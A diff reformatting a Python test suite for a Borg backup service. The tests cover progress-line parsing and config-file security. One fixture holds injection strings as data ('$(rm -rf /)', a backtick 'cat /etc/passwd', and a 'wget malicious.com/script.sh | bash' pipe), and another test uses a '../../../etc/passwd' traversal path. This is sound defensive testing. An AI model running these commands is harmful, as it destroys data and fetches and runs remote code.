@@ -1,19 +1,20 @@
 """
 Core tests for BorgService - focusing on critical security and functionality
 """
+
 from unittest.mock import Mock, patch, mock_open
 
-from app.services.borg_service import BorgService
-from app.models.database import Repository
+from services.borg_service import BorgService
+from models.database import Repository
 
 
 class TestBorgServiceCore:
     """Test core BorgService functionality and security."""
-    
+
     def setup_method(self):
         """Set up test fixtures."""
         self.borg_service = BorgService()
-        
+
         # Create mock repository
         self.mock_repository = Mock(spec=Repository)
         self.mock_repository.id = 1
@@ -24,7 +25,7 @@ class TestBorgServiceCore:
     def test_service_initialization(self):
         """Test BorgService initializes correctly."""
         service = BorgService()
-        assert hasattr(service, 'progress_pattern')
+        assert hasattr(service, "progress_pattern")
         assert service.progress_pattern is not None
 
     def test_progress_pattern_matching(self):
@@ -32,14 +33,14 @@ class TestBorgServiceCore:
         # Test valid Borg progress line
         test_line = "1234567 654321 111111 150 /path/to/some/important/file.txt"
         match = self.borg_service.progress_pattern.match(test_line)
-        
+
         assert match is not None
-        assert match.group('original_size') == "1234567"
-        assert match.group('compressed_size') == "654321" 
-        assert match.group('deduplicated_size') == "111111"
-        assert match.group('nfiles') == "150"
-        assert match.group('path') == "/path/to/some/important/file.txt"
-        
+        assert match.group("original_size") == "1234567"
+        assert match.group("compressed_size") == "654321"
+        assert match.group("deduplicated_size") == "111111"
+        assert match.group("nfiles") == "150"
+        assert match.group("path") == "/path/to/some/important/file.txt"
+
         # Test invalid line doesn't match
         invalid_line = "This is not a progress line"
         assert self.borg_service.progress_pattern.match(invalid_line) is None
@@ -47,16 +48,16 @@ class TestBorgServiceCore:
 
 class TestBorgConfigParsingSecurity:
     """Test Borg config parsing for security and correctness."""
-    
+
     def setup_method(self):
         """Set up test fixtures."""
         self.borg_service = BorgService()
 
     def test_parse_config_file_not_found(self):
         """Test handling when config file doesn't exist."""
-        with patch('os.path.exists', return_value=False):
+        with patch("os.path.exists", return_value=False):
             result = self.borg_service._parse_borg_config("/nonexistent/repo")
-            
+
             assert result["mode"] == "unknown"
             assert result["requires_keyfile"] is False
             assert "Config file not found" in result["preview"]
@@ -72,13 +73,12 @@ storage_quota = 0
 additional_free_space = 0
 key = this_is_a_very_long_embedded_encryption_key_data_that_indicates_repokey_mode_encryption
 """
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=config_content)), \
-             patch('os.listdir', return_value=[]):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=config_content)
+        ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
-            
+
             assert result["mode"] == "repokey"
             assert result["requires_keyfile"] is False
             assert "repokey mode" in result["preview"]
@@ -95,13 +95,12 @@ storage_quota = 0
 additional_free_space = 0
 key = 
 """
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=config_content)), \
-             patch('os.listdir', return_value=['key.repository_id_12345', 'data']):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=config_content)
+        ), patch("os.listdir", return_value=["key.repository_id_12345", "data"]):
             result = self.borg_service._parse_borg_config("/test/repo")
-            
+
             assert result["mode"] == "keyfile"
             assert result["requires_keyfile"] is True
             assert "keyfile mode" in result["preview"]
@@ -117,13 +116,12 @@ append_only = 0
 storage_quota = 0
 additional_free_space = 0
 """
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=config_content)), \
-             patch('os.listdir', return_value=[]):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=config_content)
+        ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
-            
+
             assert result["mode"] == "none"
             assert result["requires_keyfile"] is False
             assert "Unencrypted repository" in result["preview"]
@@ -134,12 +132,12 @@ additional_free_space = 0
 not_a_repository = true
 invalid_config = yes
 """
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=config_content)):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=config_content)
+        ):
             result = self.borg_service._parse_borg_config("/test/repo")
-            
+
             assert result["mode"] == "invalid"
             assert result["requires_keyfile"] is False
             assert "Not a valid Borg repository" in result["preview"]
@@ -156,23 +154,22 @@ additional_free_space = 0
 algorithm = AES256-CBC
 cipher = encrypted_data_here
 """
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=config_content)), \
-             patch('os.listdir', return_value=[]):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=config_content)
+        ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/test/repo")
-            
+
             assert result["mode"] == "encrypted"
             assert "encryption detected" in result["preview"].lower()
 
     def test_parse_config_read_permission_error(self):
         """Test handling of permission denied errors."""
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', side_effect=PermissionError("Access denied")):
-            
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", side_effect=PermissionError("Access denied")
+        ):
             result = self.borg_service._parse_borg_config("/restricted/repo")
-            
+
             assert result["mode"] == "error"
             assert result["requires_keyfile"] is False
             assert "Error reading config" in result["preview"]
@@ -180,11 +177,11 @@ cipher = encrypted_data_here
 
     def test_parse_config_io_error(self):
         """Test handling of I/O errors during file reading."""
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', side_effect=IOError("Disk error")):
-            
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", side_effect=IOError("Disk error")
+        ):
             result = self.borg_service._parse_borg_config("/failing/repo")
-            
+
             assert result["mode"] == "error"
             assert "Error reading config" in result["preview"]
 
@@ -194,34 +191,34 @@ cipher = encrypted_data_here
 this is malformed ini content
 key value without equals sign
 [incomplete_section"""
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=malformed_content)):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=malformed_content)
+        ):
             result = self.borg_service._parse_borg_config("/malformed/repo")
-            
+
             assert result["mode"] == "error"
             assert "Error reading config" in result["preview"]
 
     def test_parse_config_unicode_error(self):
         """Test handling of unicode decode errors."""
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open()) as mock_file:
-            
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open()
+        ) as mock_file:
             # Simulate unicode decode error
             mock_file.return_value.read.side_effect = UnicodeDecodeError(
                 "utf-8", b"\xff\xfe binary content", 0, 2, "invalid start byte"
             )
-            
+
             result = self.borg_service._parse_borg_config("/binary/repo")
-            
+
             assert result["mode"] == "error"
             assert "Error reading config" in result["preview"]
 
 
 class TestBorgServiceSecurityIntegration:
     """Test that BorgService properly integrates security measures."""
-    
+
     def setup_method(self):
         """Set up test fixtures."""
         self.borg_service = BorgService()
@@ -230,11 +227,11 @@ class TestBorgServiceSecurityIntegration:
         """Test that config parsing validates repository paths."""
         # Test with malicious path
         malicious_path = "../../../etc/passwd"
-        
+
         # The method should handle path validation safely
         # (Current implementation doesn't validate input paths, but it should)
         result = self.borg_service._parse_borg_config(malicious_path)
-        
+
         # Should handle gracefully without exposing system files
         assert isinstance(result, dict)
         assert "mode" in result
@@ -249,14 +246,13 @@ id = $(rm -rf /)
 segments_per_dir = `cat /etc/passwd`
 key = ; wget malicious.com/script.sh | bash
 """
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=dangerous_content)), \
-             patch('os.listdir', return_value=[]):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=dangerous_content)
+        ), patch("os.listdir", return_value=[]):
             # Should parse safely without executing anything
             result = self.borg_service._parse_borg_config("/test/repo")
-            
+
             # Should treat it as a normal config, not execute the content
             assert isinstance(result, dict)
             assert result["mode"] in ["none", "encrypted", "error"]
@@ -265,14 +261,13 @@ key = ; wget malicious.com/script.sh | bash
         """Test that config parsing handles unusually large files safely."""
         # Create very large content
         large_content = "[repository]\n" + "dummy_key = " + "x" * 100000 + "\n"
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=large_content)), \
-             patch('os.listdir', return_value=[]):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=large_content)
+        ), patch("os.listdir", return_value=[]):
             # Should handle without crashing or consuming excessive memory
             result = self.borg_service._parse_borg_config("/large/repo")
-            
+
             assert isinstance(result, dict)
             assert "mode" in result
 
@@ -282,23 +277,22 @@ key = ; wget malicious.com/script.sh | bash
 id = 1234567890abcdef1234567890abcdef12345678
 key = 
 """
-        
+
         # Mock directory listing that might contain sensitive files
         mock_files = [
-            'key.repository_id_12345',
-            '.secret_file',
-            'password.txt', 
-            'keyfile.backup',
-            'authorized_keys',
-            'id_rsa'
+            "key.repository_id_12345",
+            ".secret_file",
+            "password.txt",
+            "keyfile.backup",
+            "authorized_keys",
+            "id_rsa",
         ]
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=config_content)), \
-             patch('os.listdir', return_value=mock_files):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=config_content)
+        ), patch("os.listdir", return_value=mock_files):
             result = self.borg_service._parse_borg_config("/test/repo")
-            
+
             # Should only identify legitimate Borg key files
             assert result["mode"] == "keyfile"
             assert result["requires_keyfile"] is True
@@ -312,16 +306,16 @@ key =
         # Test with various error scenarios
         error_scenarios = [
             (FileNotFoundError("No such file or directory"), "file system paths"),
-            (PermissionError("Operation not permitted"), "permission details"),  
+            (PermissionError("Operation not permitted"), "permission details"),
             (OSError("Device or resource busy"), "system resources"),
         ]
-        
+
         for exception, context in error_scenarios:
-            with patch('os.path.exists', return_value=True), \
-                 patch('builtins.open', side_effect=exception):
-                
+            with patch("os.path.exists", return_value=True), patch(
+                "builtins.open", side_effect=exception
+            ):
                 result = self.borg_service._parse_borg_config("/test/repo")
-                
+
                 assert result["mode"] == "error"
                 # Error message should be sanitized and not leak sensitive info
                 preview = result["preview"].lower()
@@ -332,32 +326,30 @@ key =
 
 class TestBorgServiceEdgeCases:
     """Test edge cases and boundary conditions."""
-    
+
     def setup_method(self):
         """Set up test fixtures."""
         self.borg_service = BorgService()
 
     def test_empty_config_file(self):
         """Test parsing completely empty config file."""
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data="")), \
-             patch('os.listdir', return_value=[]):
-            
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data="")
+        ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/empty/repo")
-            
+
             assert result["mode"] == "invalid"
             assert "Not a valid Borg repository" in result["preview"]
 
     def test_whitespace_only_config(self):
         """Test parsing config with only whitespace."""
         whitespace_content = "   \n\t\n   \n"
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=whitespace_content)), \
-             patch('os.listdir', return_value=[]):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=whitespace_content)
+        ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/whitespace/repo")
-            
+
             assert result["mode"] == "invalid"
 
     def test_config_with_comments_only(self):
@@ -366,13 +358,12 @@ class TestBorgServiceEdgeCases:
 ; This is also a comment  
 # [repository] - this is commented out
 ; key = commented key"""
-        
-        with patch('os.path.exists', return_value=True), \
-             patch('builtins.open', mock_open(read_data=comment_content)), \
-             patch('os.listdir', return_value=[]):
-            
+
+        with patch("os.path.exists", return_value=True), patch(
+            "builtins.open", mock_open(read_data=comment_content)
+        ), patch("os.listdir", return_value=[]):
             result = self.borg_service._parse_borg_config("/comments/repo")
-            
+
             assert result["mode"] == "invalid"
 
     def test_progress_pattern_edge_cases(self):
@@ -381,22 +372,24 @@ class TestBorgServiceEdgeCases:
         minimal_line = "0 0 0 0 /"
         match = self.borg_service.progress_pattern.match(minimal_line)
         assert match is not None
-        assert match.group('path') == "/"
-        
+        assert match.group("path") == "/"
+
         # Test with very large numbers
-        large_numbers_line = "999999999999 888888888888 777777777777 1000000 /very/long/path/to/file"
+        large_numbers_line = (
+            "999999999999 888888888888 777777777777 1000000 /very/long/path/to/file"
+        )
         match = self.borg_service.progress_pattern.match(large_numbers_line)
         assert match is not None
-        assert match.group('original_size') == "999999999999"
-        
+        assert match.group("original_size") == "999999999999"
+
         # Test with spaces in path (should work)
         space_path_line = "100 50 25 5 /path with spaces/file name.txt"
         match = self.borg_service.progress_pattern.match(space_path_line)
         assert match is not None
-        assert match.group('path') == "/path with spaces/file name.txt"
-        
+        assert match.group("path") == "/path with spaces/file name.txt"
+
         # Test with special characters in path
         special_chars_line = "100 50 25 5 /path/with-special_chars@#$/file.txt"
         match = self.borg_service.progress_pattern.match(special_chars_line)
         assert match is not None
-        assert match.group('path') == "/path/with-special_chars@#$/file.txt"
+        assert match.group("path") == "/path/with-special_chars@#$/file.txt"
